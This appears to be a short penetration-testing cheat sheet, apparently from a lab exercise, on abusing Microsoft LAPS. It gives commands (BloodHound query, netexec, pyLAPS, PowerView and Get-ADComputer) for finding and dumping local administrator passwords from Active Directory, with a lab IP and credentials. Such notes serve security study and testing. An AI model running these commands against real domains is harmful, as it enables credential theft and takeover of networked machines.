## What is?
Microsoft's [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) allows companies to manage their local admin passwords better: instead of having a shared password between local admins (which happens all the time), `LAPS` offers a simple method to make local admins with random and cryptographically strong passwords that rotate every 30 days (by default).


## How to Identify?
You can check it from Bloodhound with following query.
```cypher
MATCH p=((n)-[r:ReadLAPSPassword]->(m)) RETURN p
```
You can do it from Windows with the following command.
```powershell-session
Find-AdmPwdExtendedRights -Identity *
```
Or you can do all in one via netexec directly from you Kali machine, this will dump all the passwords as well.
```
netexec ldap 10.129.80.58 -u yolanda -p 'Coglione1!' -M laps
```


## How to attack?
You can do it directly from Linux in Netexec, this will dump all the LAPS password that the shipped user can reach.
```
netexec ldap 10.129.80.58 -u yolanda -p 'Coglione1!' -M laps
```
Or you can use Pylaps to do same, again from Linux.
```
pyLAPS.py --action get -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc-ip "$DC_IP"
```
If you can only work on Windows then you can use the following commando to perform the same task.
```powershell-session
//Via Powerview.ps1
Get-DomainObject -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name

OR directly in AD native
Get-ADComputer -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name
```